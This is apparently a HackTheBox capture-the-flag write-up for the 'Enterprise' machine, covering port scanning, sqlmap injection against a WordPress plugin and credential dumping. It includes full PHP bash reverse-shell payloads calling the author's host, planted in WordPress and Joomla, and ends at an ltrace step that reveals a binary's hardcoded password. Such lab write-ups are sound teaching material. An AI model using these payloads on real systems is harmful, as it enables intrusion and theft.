---
title: "Enterprise"
date: 2020-11-15T19:47:18+01:00
draft: false
summary: "This was quite a challenging machine as it featured both knowledge of wordpress joomla, and for privileage escalation it needed a buffer overflow."
---


#### Machine Skills
---
This was quite a challenging machine as it featured both knowledge of wordpress joomla, and for privileage escalation it needed a buffer overflow.


-----
#### Step 1 - Enumeration
-----
As usual the first part of the hack is the enumeration. For this I used a new tool masscan 

-----
------
```bat
sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.61

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-09 16:29:04 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 32812/tcp on 10.10.10.61                                  
Discovered open port 8080/tcp on 10.10.10.61                                   
Discovered open port 22/tcp on 10.10.10.61                                     
Discovered open port 443/tcp on 10.10.10.61                                    
Discovered open port 80/tcp on 10.10.10.61  
```
-------
-------
A number of useful ports were easy to identify on the machine 8080,443, 80. All of these were possible web interfaces.

After looking through the websites all I could find was an interesting email, and that the on  port 8080 the machine was running joomla and on port 80 it was running wordpress. This was odd

![Search pages](/Enterprise/Certificate.png)
##### [Figure 1.0 - Intersting Certificate ] 

On the certificate of the application runing on 443 I found an interesting email that later on turned out to be the name of the user. I kept this close.

To further investigate I used dirbuster to see if I can find any intersting files or folders on the machine.

-----
------
```bat
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.61
[+] Threads:        50
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/02 04:48:14 Starting gobuster
===============================================================
/files (Status: 301)
/server-status (Status: 403)
```
-------
-------

Here I found the files folder that contained information of interest. The other found path was down or innacessible. 

![Search pages](/Enterprise/Files.png)
##### [Figure 1.1 - /files page ] 

On the files page I looked around and found lcars. After researching it I found out that this is a plugin for wordpress. Therefore I looked at things that I could do with it. in the end I found a way to check for sql errors



----
### Step 2 -Exploitation
---

![Search pages](/Enterprise/FatalError.png)
##### [Figure 2.1 - sql errir ] 

What I found was that the page was vulnerable to sql injections. I intercepted the request again using buipsuite and used the header as a base for an sqlmap attack. 

-----
------
```bat
sqlmap -r lcarss.req -p query --dbms mysql --risk 1 --level 1 

Parameter: query (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: query=(SELECT (CASE WHEN (9163=9163) THEN 22 ELSE (SELECT 4697 UNION SELECT 9178) END))

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: query=(SELECT 9158 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(9158=9158,1))),0x71626a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: query=22 AND (SELECT 1891 FROM (SELECT(SLEEP(5)))eCYZ)
---
[05:06:06] [INFO] testing MySQL
[05:06:06] [INFO] confirming MySQL
[05:06:06] [INFO] the back-end DBMS is MySQL

```
-------
-------
After a few tries this is the sqlmap command that worked. With the use of this and the command `sqlmap -u "http://`10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=50&#8243; –dbms=mysql -D wordpress –dump`

A list of usernames and passswords were found. Using these credentials I was able to get inside the wordpress administrator page  at ` http://10.10.10.61/wp-login.php ` 

![Search pages](/Enterprise/LoginPage.png)
##### [Figure 2.2 - Wordpress Logged In ] 

Over here I looked into the pluggins page and was able to find the lcars plugin where I inserted the code for a reverse shell `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'");?>` 
After placing a listener with `nc -nvlp 9001` on my machine I ran the lcars.php file.

![Search pages](/Enterprise/PluginShell.png)
##### [Figure 2.3 - Plugin Shell ] 
From this point I got a shell inside the wordpress server


----
### Step 3 - Foothold
---

![Search pages](/Enterprise/UserAccess.png)
##### [Figure 3.1 - Plugin Shell ] 
At this point I got user access on the machine but I did not have a proper user, after further inspection the user.txt said the following

-----
------
```bat
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```
-------
-------

After further inspection I realised that I was in a docker container from the ip of the machine 172.17.0.14. Next I needed to check the other service that had joomla on it

![Search pages](/Enterprise/JoomlaLogin.png)
##### [Figure 3.2 - Login jommla ]

After going through some of the passowrds found in the sqlmap dump I was able to login.

![Search pages](/Enterprise/JoomlaShell.png)
##### [Figure 3.3 - jommla get shell ]

Using the same method used with the wordpress login I was able to create a reverse shell for the joomla machine. Once in the machine after some looking around I found out that there was a root folder that had write permissions on it. It was the files folder. This lead me to believe that this is the actual machine that has user.txt but in fact it was a fake like the last one.

After further investigation I realized that the files folder was the one from port 443 and most likely the one with the user.txt. I placed a file with a reverse shell php on it 
`echo $' <?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.8/9098 0>&1\'"); ?> >> reverseshell.php'`


![Search pages](/Enterprise/JeanLucPicard.png)
##### [Figure 3.4 - Jean Luc Picard login]

This gave me the permissions needed to access the actual user account and get a foothold into the machine.

---
### Step 4 - Privilage Escalation
---

From the machine that I was hacking I called ``netstat -antup` to see all the processes on the machine. With this I was able to identify 2 more ports 5355 and 32812. After using  `nc -nv 10.10.10.61 {port}` on both of them to see if this gets me anything I was able to find the lcars program.

Not sure what it is supposed to do but after running it on my machine I was able to use 
`ltrace ./lcars.binary `

and in the result found the password

----
----
```bat
__libc_start_main(0x56652c91, 1, 0xffdc65b4, 0x56652d30 <unfinished ...> 
---SNIP--
fgets( 
"\n", 9, 0xf7edb540)                                                                                   = 0xffdc64e7 
strcmp("\n", 
````
___"picarda1")___     

````                                                                              = -1 
---SNIP---
exit(0 <no return ...> 
+++ exited (status 0) +++
```
----
----

That being picarda1

With this I was able to use the application.
